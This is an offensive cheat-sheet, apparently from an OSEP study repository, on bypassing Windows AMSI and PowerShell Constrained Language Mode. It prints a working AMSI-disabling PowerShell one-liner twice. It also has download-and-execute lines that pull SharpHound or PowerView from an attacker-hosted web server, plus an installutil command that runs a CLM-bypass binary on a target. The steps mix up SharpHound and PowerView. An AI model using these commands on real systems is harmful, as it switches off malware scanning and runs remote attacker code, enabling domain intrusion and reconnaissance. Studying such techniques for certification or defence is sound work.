# AMSI and Constrained Languages Mode Bypass

## Methode 1 - CLM Bypass to AMSI Bypass through text file.

1. Download the Source Code of CLM Bypass and compile it.

*  <a href="https://github.com/V0lk3n/OSEP-CheatSheet/tree/main/Bypasses/CLM%20Bypass">CLM Bypass</a>

2. Create a text file to bypass AMSI and import/execute the needed PowerShell script or whatever.

Example using SharpHound PowerShell Script and saving the output to log.txt file :
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
iex((new-object system.net.webclient).downloadstring('http://192.168.X.X/SharpHound.ps1'))
Get-DomainComputer -Unconstrained >> "C:\Users\Public\log.txt"
```
3. Place the PowerShell script, and AMSI bypass text file in the same location and host them inside a web server.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ ls                                                                                                                              1 ⨯
amsi-bypass-powershell.txt  PowerView.ps1
 
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

4. Execute the CLM Bypass exe on the target server using installutil to trigger the Uninstall function.

```PowerShell
PS C:\Users\Public> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U CLM-Bypass.exe
```

5. Read the log.txt file to get the script output.

## Methode 2 - Manually AMSI Bypass.

1. Bypass AMSI

```PowerShell
PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

2. Load remotely PowerView.ps1 inside memory (iex).

```PowerShell
PS C:\> (new-object system.net.webclient).downloadstring('http://Attacker:port/PowerView.ps1') | iex
```

3. Execute PowerView normally.
